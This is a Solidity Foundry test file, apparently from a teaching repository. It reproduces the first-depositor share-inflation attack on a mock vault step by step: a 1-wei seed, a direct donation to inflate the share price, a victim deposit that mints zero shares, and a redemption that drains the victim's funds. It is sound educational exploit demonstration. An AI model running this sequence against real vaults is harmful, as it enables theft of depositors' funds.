// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../../src/ch04/MockERC20.sol";
import {ShareVault} from "../../src/ch04/ShareVault.sol";

/// @notice The first-depositor inflation attack. The attacker seeds the vault
///         with 1 wei, donates a large amount to spike the share price, and the
///         victim's subsequent deposit mints ZERO shares — the attacker then
///         redeems its single share for everything.
contract ShareInflationTest is Test {
    MockERC20 internal asset;
    ShareVault internal vault;

    address internal attacker = address(0xBAD);
    address internal victim = address(0x1C71);

    uint256 internal constant DONATION = 10_000 ether;
    uint256 internal constant VICTIM_DEPOSIT = 10_000 ether;

    function setUp() public {
        asset = new MockERC20();
        vault = new ShareVault(asset);

        asset.mint(attacker, DONATION + 1); // 1 wei to seed, the rest to donate
        asset.mint(victim, VICTIM_DEPOSIT);
    }

    function test_exploit_firstDepositorStealsVictimDeposit() public {
        // 1. Attacker seeds the vault with the smallest possible deposit.
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        uint256 attackerShares = vault.deposit(1);
        assertEq(attackerShares, 1, "attacker holds the only share");

        // 2. Attacker DONATES straight to the vault (not a deposit), inflating the
        //    price of that single share to ~DONATION assets.
        asset.transfer(address(vault), DONATION);
        vm.stopPrank();

        assertEq(vault.totalShares(), 1, "still just one share outstanding");
        assertEq(vault.totalAssets(), DONATION + 1, "but the share now 'owns' 10k+ assets");

        // 3. Victim deposits a full 10k. Shares = 10000e18 * 1 / (10000e18 + 1) = 0.
        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        uint256 victimShares = vault.deposit(VICTIM_DEPOSIT);
        vm.stopPrank();

        assertEq(victimShares, 0, "VICTIM MINTED ZERO SHARES for a 10k deposit");

        // 4. Attacker redeems its one share and takes essentially everything.
        vm.prank(attacker);
        uint256 out = vault.redeem(1);

        // Attacker put in 1 wei + 10k donation and pulls out ~20k: net +10k, which
        // is exactly the victim's deposit.
        assertGt(out, DONATION + VICTIM_DEPOSIT - 1 ether, "attacker drained the victim's deposit");
        assertEq(vault.shares(victim), 0, "victim has nothing to redeem");
    }
}
